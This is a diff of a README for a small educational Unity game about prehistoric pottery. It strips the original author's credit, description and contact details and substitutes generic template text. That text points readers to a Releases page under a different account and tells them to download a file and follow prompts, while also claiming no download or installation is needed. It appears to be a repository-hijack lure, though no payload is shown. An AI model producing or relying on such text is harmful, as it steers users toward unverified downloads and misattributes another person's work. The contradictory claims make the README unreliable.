@@ -1,14 +1,64 @@
-# [Archeology Game - Indiana Aardewerk](https://hovinhthanh7893.github.io/indiana-aardewerk/)
+# 🎮 indiana-aardewerk - Enjoy a Fun, Educational 2D Game
 
-[https://hovinhthanh7893.github.io/indiana-aardewerk/](https://hovinhthanh7893.github.io/indiana-aardewerk/)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/sadikarahman066/indiana-aardewerk/releases)
 
-Updated December 2025
+## 🚀 Getting Started
 
-This game was made within a Smart Solution Semester project for Archaeology faculty of Saxion University. The goal of the project is digitalising old-fashion prehistoric pottery lectures and giving students different means of receiving the knowledge, so that the students will be more interested in learning about prehistoric pottery.
+Welcome to **indiana-aardewerk**, a lightweight 2D game created with Unity. This game is both educational and fun, perfect for anyone looking to learn while playing. You can play it directly in your web browser, making it easy to access and share with friends.
 
-The game was inspired by the Gold Miner game. The player will play as an intern at the archeological excavation site. This intern will learn about different aspects of archeology revolving around prehistoric pottery. There is the character "the boss" plays as the task giver of the game, but he is also the teacher to provide players some small pieces of information about prehistoric pottery.
+## 📝 What You Need
 
-The game is still open to be developed bigger. The game map can be extended for more interesting game mechanics which are suitable to transfer more knowledge about prehistoric pottery.
+Before you start, here are some basic requirements to run the game:
 
----
-More questions? Please send email to [hovinhthanh7893@gmail.com](mailto:hovinhthanh7893@gmail.com) or text me on [LinkedIn](https://www.linkedin.com/in/hovinhthanh7893/)
+- Any modern web browser (Google Chrome, Firefox, Safari, etc.)
+- A stable internet connection
+- No installation is required! Just load the game in your browser.
+
+## 🏷️ Game Features
+
+- **Educational Content**: Ideal for learning concepts in a fun way.
+- **Lightweight**: Designed for quick loading.
+- **WebGL Support**: Play directly in your browser without any downloads.
+- **Optimized Performance**: Low on resources while offering a smooth gaming experience.
+- **Easy Integration**: Great for demos and prototypes.
+
+## 📲 Download & Install
+
+To get started, go to our [Releases page](https://github.com/sadikarahman066/indiana-aardewerk/releases) to download the latest version. 
+
+1. Click on the link above.
+2. Look for the latest version listed.
+3. Download the file and follow any prompts.
+4. Open your browser and use the link provided to access the game.
+
+## 🌟 How to Play
+
+1. Open your web browser.
+2. Go to the game link provided on the Releases page.
+3. Follow the on-screen instructions to start playing.
+
+## 🛠️ Troubleshooting
+
+If you encounter any problems, try these solutions:
+
+- **Clear Browser Cache**: Sometimes, your browser might hold old data.
+- **Try a Different Browser**: If one browser does not work, another might.
+- **Check Your Internet Connection**: Make sure you are connected and stable.
+
+## 💬 Connect With Us
+
+We aim for continuous improvement. If you have feedback, questions, or ideas, feel free to reach out! You can open an issue on our GitHub repository or leave comments on the game page.
+
+## 💻 Topics
+
+- 2D Game
+- Canvas Game Development
+- C# Programming
+- Educational Projects
+- Game Design
+
+## 📄 License
+
+This project is open-source. You can check the license details in the repository. Feel free to explore, fork, and modify the game to fit your needs.
+
+We hope you enjoy playing **indiana-aardewerk** and find it to be an engaging educational experience!
